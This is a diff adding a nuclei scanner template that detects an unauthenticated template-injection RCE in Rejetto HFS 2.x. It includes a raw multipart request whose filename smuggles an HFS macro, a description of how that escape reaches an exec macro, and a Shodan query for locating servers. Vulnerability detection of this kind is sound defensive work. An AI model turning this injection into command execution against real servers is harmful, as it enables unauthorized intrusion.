@@ -1,0 +1,69 @@
+id: hfs2-upload-filename-template-injection-rce
+
+info:
+  name: Rejetto HFS 2.x - Unauthenticated RCE via multipart upload filename (template injection)
+  author: wgetnz
+  severity: critical
+  description: |
+    Rejetto HTTP File Server (HFS) 2.x inserts the multipart upload `filename`
+    into the server-side template symbol map as `%item-resource%` WITHOUT applying
+    `macroQuote()`/`htmlEncode()` — unlike its sibling fields `%item-name%` and
+    `%item-url%`. Because the template engine's `xtpl()` performs sequential global
+    replacements, a filename that itself contains `%item-resource%` is substituted a
+    second time, so the attacker controls an unescaped value in the symbol map. A
+    `:}` sequence inside that value terminates the engine's `{: ... :}` quoting
+    region, exposing an executable `{.exec|...}` macro to the macro dispatcher, which
+    performs no authorization check of its own. The result is unauthenticated OS
+    command execution in the context of the HFS process.
+
+    The detector below uses an arithmetic oracle: `7000788` is deliberately absent
+    from the request payload, so its appearance in the response can only be produced
+    by the template engine evaluating the injected expression.
+  reference:
+    - https://github.com/rejetto/hfs2
+    - https://mohemiv.com/all/rejetto-http-file-server-2-3m-unauthenticated-rce/
+    - https://www.cve.org/CVERecord?id=CVE-2024-23692
+  classification:
+    cwe-id: CWE-1336
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: rejetto
+    product: http-file-server
+    shodan-query: 'Server: HFS'
+  tags: rejetto,hfs,ssti,rce,unauth,fileupload
+
+http:
+  # NOTE: the payload must reach the server byte-exact. Several HTTP clients
+  # normalise or URL-encode '%', '{' and '|' inside the multipart filename, in
+  # which case the payload never reaches the macro engine. `unsafe: true`
+  # disables nuclei's own request normalisation for this raw request.
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=X
+        Connection: close
+
+        --X
+        Content-Disposition: form-data; name="f"; filename="%item-resource%:}{.add|7000000|788.}"
+        Content-Type: application/octet-stream
+
+        hi
+        --X--
+    unsafe: true
+    matchers-condition: and
+    matchers:
+      # 7000788 is NOT present contiguously in the payload, so a match proves the
+      # server evaluated the injected `{.add|...}` macro (template injection).
+      - type: word
+        part: body
+        words:
+          - "7000788"
+      # keep the false-positive surface closed: only a 200 from the HFS upload
+      # handler is meaningful
+      - type: status
+        status:
+          - 200
